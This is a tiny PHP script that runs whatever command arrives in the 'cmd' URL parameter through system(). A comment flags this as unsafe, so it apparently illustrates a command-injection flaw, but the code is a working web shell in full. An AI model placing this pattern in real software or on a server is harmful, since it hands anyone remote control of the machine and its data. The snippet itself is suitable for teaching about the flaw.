<?php
if (isset($_GET['cmd'])) {
    // User input is directly used in a system command
    $command = $_GET['cmd'];
    system($command);
}
?>
